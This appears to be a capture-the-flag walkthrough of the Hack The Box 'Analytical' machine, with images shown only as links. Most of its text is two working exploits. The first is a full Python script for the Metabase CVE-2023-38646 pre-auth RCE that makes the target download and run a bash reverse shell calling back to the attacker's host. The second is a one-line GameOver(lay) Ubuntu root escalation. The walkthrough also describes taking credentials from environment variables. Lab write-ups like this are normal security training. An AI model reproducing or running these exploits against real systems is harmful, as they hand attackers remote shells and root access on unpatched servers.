nmap
![[Pasted image 20260404140855.png]]

Homepage web
![[Pasted image 20260404141250.png]]

Subdomain web (data.analytical.htb)
![[Pasted image 20260404141341.png]]

Version metabase (v0.46.6)
![[Pasted image 20260404141426.png]]
CVE-2023-38646
![[Pasted image 20260404141540.png]]

Change the code so it can rev shell
```python
#!/usr/bin/env python3

# Exploit Title: metabase 0.46.6 - Pre-Auth Remote Code Execution (Reverse Shell Edition)
# CVE : CVE-2023-38646
# Original Author: Musyoka Ian
# Modified: Reverse shell support

import requests
import threading
import sys
import argparse
import re
from termcolor import colored
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any


success = False
setup_token = None


class Handler(BaseHTTPRequestHandler):
    """Serves the reverse shell payload via HTTP."""

    def do_GET(self):
        global success

        if self.path == "/exploitable":
            # This endpoint is used during the vulnerability check
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"exploitable")
            success = True

        elif self.path == "/shell.sh":
            # Serves the reverse shell bash script
            revshell = (
                f"#!/bin/bash\n"
                f"bash -i >& /dev/tcp/{argument.lhost}/{argument.lport} 0>&1\n"
            )
            self.send_response(200)
            self.end_headers()
            self.wfile.write(revshell.encode())
            print(colored("[+] Reverse shell script fetched by target!", "green"))

        else:
            pass

    def log_message(self, format: str, *args: Any) -> None:
        return None


def run_http_server():
    server = HTTPServer(("0.0.0.0", argument.sport), Handler)
    server.serve_forever()


def get_setup_token():
    print(colored("[*] Retrieving setup token...", "green"))
    r = requests.get(f"{argument.url}/api/session/properties")
    token = re.search('"setup-token":"(.*?)"', r.text, re.DOTALL)
    if not token:
        print(colored("[-] Could not retrieve setup token. Is the URL correct?", "red"))
        sys.exit(1)
    setup_token = token.group(1)
    print(colored(f"[+] Setup token: {setup_token}", "green"))
    return setup_token


def build_payload(token, command):
    return {
        "token": token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": (
                    f"zip:/app/metabase.jar!/sample-database.db;"
                    f"MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1"
                    f"\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
                    f"java.lang.Runtime.getRuntime().exec('{command}')\n"
                    f"$$--=x"
                ),
                "advanced-options": False,
                "ssl": True,
            },
            "name": "an-sec-research-team",
            "engine": "h2",
        },
    }


def check_vulnerable(token):
    print(colored("[*] Testing if Metabase is vulnerable...", "green"))

    check_payload = {
        "token": token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": (
                    f"zip:/app/metabase.jar!/sample-database.db;"
                    f"MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1"
                    f"\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
                    f"new java.net.URL('http://{argument.lhost}:{argument.sport}/exploitable').openConnection().getContentLength()\n"
                    f"$$--=x\\;"
                ),
                "advanced-options": False,
                "ssl": True,
            },
            "name": "an-sec-research-musyoka",
            "engine": "h2",
        },
    }

    for _ in range(10):
        requests.post(f"{argument.url}/api/setup/validate", json=check_payload)
        if success:
            print(colored("[+] Target is vulnerable!", "green"))
            return True

    print(colored("[-] Target does not appear vulnerable.", "red"))
    sys.exit(1)


def exploit(token):
    """
    Two-step reverse shell:
      1. Download shell.sh from our HTTP server to /dev/shm/
      2. Execute it with bash to trigger the reverse shell
    """

    print(colored(f"[*] Step 1: Making target download reverse shell script...", "blue"))
    dl_cmd = f"curl http://{argument.lhost}:{argument.sport}/shell.sh -o /dev/shm/shell.sh"
    dl_payload = build_payload(token, dl_cmd)
    requests.post(f"{argument.url}/api/setup/validate", json=dl_payload)

    # Small delay to ensure download completes
    import time
    time.sleep(2)

    print(colored(f"[*] Step 2: Executing reverse shell...", "blue"))
    print(colored(f"[!] Start your listener:  nc -lvnp {argument.lport}", "yellow"))
    exec_cmd = "bash /dev/shm/shell.sh"
    exec_payload = build_payload(token, exec_cmd)
    requests.post(f"{argument.url}/api/setup/validate", json=exec_payload)

    print(colored("[+] Payload sent! Check your listener.", "green"))


if __name__ == "__main__":
    print(colored("[*] CVE-2023-38646 - Pre-Auth RCE in Metabase [Reverse Shell]", "magenta"))

    args = argparse.ArgumentParser(description="CVE-2023-38646 Reverse Shell Exploit")
    args.add_argument("-l", "--lhost", metavar="", help="Your IP (attacker)", type=str, required=True)
    args.add_argument("-p", "--lport", metavar="", help="Reverse shell listener port", type=int, required=True)
    args.add_argument("-P", "--sport", metavar="", help="HTTP server port (to serve shell.sh)", type=int, required=True)
    args.add_argument("-u", "--url",   metavar="", help="Metabase URL (e.g. http://10.10.11.x:3000)", type=str, required=True)
    argument = args.parse_args()

    if argument.url.endswith("/"):
        argument.url = argument.url[:-1]

    # Start HTTP server in background
    print(colored(f"[+] Starting HTTP server on port {argument.sport}...", "blue"))
    t = threading.Thread(target=run_http_server, daemon=True)
    t.start()

    token = get_setup_token()
    check_vulnerable(token)
    exploit(token)
```
![[Pasted image 20260404141811.png]]
got the revshell
![[Pasted image 20260404141826.png]]

there's contain credential on env
![[Pasted image 20260404141902.png]]

connect to ssh using those creds
![[Pasted image 20260404142158.png]]
got the user.txt

Check kernel version (6.2.0-25-generic)
![[Pasted image 20260404142419.png]]

CVE-2023-2640 & CVE-2023-32629
![[Pasted image 20260404142609.png]]

```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

got the root
![[Pasted image 20260404142916.png]]
